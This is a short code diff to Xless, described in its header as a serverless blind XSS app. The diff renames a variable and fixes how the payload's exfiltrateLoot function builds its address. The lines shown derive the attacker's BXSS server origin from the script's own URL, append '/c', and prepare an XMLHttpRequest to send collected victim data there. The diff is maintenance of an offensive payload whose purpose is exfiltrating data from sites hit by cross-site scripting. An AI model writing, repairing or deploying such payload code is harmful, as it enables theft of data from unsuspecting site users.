@@ -1,7 +1,7 @@
 // Xless: The serverlesss Blind XSS app.
 // Author: Mazin Ahmed <mazin@mazinahmed.net>
 (function () {
-  var curScript = (!!document.currentScript && document.currentScript.src) || import.meta?.url;
+  var scriptUrl = (!!document.currentScript && document.currentScript.src) || import.meta?.url;
 
   console.log("Loaded xless.");
 
@@ -79,7 +79,7 @@
 
   function exfiltrateLoot(collectedData) {
     // Get the URI of our BXSS server
-    var uri = new URL(curScript.src);
+    var uri = new URL(scriptUrl);
     var exfUrl = uri.origin + "/c";
 
     var xhr = new XMLHttpRequest();
